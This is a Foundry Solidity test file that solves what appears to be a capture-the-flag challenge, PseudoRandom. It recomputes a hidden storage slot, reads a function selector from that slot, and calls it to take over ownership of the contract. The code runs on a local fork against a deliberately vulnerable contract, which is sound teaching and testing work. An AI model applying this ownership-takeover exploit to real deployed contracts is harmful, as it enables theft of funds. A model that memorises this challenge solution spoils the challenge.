// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../src/Pseudoaleatorio.sol";

contract PseudoRandomTest is Test {
    string private BSC_RPC = "https://rpc.ankr.com/bsc"; // 56
    string private POLY_RPC = "https://rpc.ankr.com/polygon"; // 137
    string private FANTOM_RPC = "https://rpc.ankr.com/fantom"; // 250
    string private ARB_RPC = "https://rpc.ankr.com/arbitrum"; // 42161
    string private OPT_RPC = "https://rpc.ankr.com/optimism"; // 10
    string private GNOSIS_RPC = "https://rpc.ankr.com/gnosis"; // 100

    address private addr;

    function setUp() external {
        vm.createSelectFork(BSC_RPC);
    }

    function test() external {
        string memory rpc = new string(32);
        assembly {
            // network selection
            let _rpc := sload(
                add(mod(xor(number(), timestamp()), 0x06), BSC_RPC.slot)
            )
            mstore(rpc, shr(0x01, and(_rpc, 0xff)))
            mstore(add(rpc, 0x20), and(_rpc, not(0xff)))
        }

        addr = makeAddr(rpc);

        vm.createSelectFork(rpc);

        vm.startPrank(addr, addr);
        address instance = address(new PseudoRandom());

        // the solution

        // Obtenemos el slot del contrato donde está guardado el selector
        // Podríamos calcular directamente el selector, pero ya que el contrato permite leer su storage se lo pedimos a él
        uint256 slot = getSlot();
        (bool success, bytes memory result) = instance.call(abi.encodeWithSelector(0x3bc5de30, slot));
        bytes4 sig = abi.decode(result, (bytes4));

        // Enviamos el selector correcto y nos hacemos con el owner
        instance.call(abi.encodeWithSelector(sig, addr, addr));

        assertEq(PseudoRandom(instance).owner(), addr);
    }

    /*
    * Calcula el slot del contrato donde está el selector, según su propia implementación
    */
    function getSlot() public returns(uint256) {
        uint256 slot;
        bytes32[3] memory input;
        input[0] = bytes32(uint256(1));
        input[1] = bytes32(uint256(2));

        bytes32 scalar;
        assembly {
            scalar := sub(mul(timestamp(), number()), chainid())
        }
        input[2] = scalar;

        assembly {
            let success := call(gas(), 0x07, 0x00, input, 0x60, 0x00, 0x40)

            slot := xor(mload(0x00), mload(0x20))
        }

        return(slot);
    }
}